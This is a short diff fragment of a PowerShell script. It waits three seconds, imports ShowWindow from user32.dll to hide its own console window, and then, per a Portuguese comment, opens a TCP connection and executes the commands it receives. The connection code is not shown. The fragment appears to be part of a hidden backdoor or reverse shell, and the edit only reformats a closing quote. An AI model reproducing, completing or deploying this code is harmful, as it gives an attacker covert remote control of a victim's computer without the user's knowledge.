@@ -2,8 +2,7 @@
 Start-Sleep -Seconds 3
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
 [Console.Window]::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)
 
 # Estabelece a conexão TCP e executa comandos recebidos
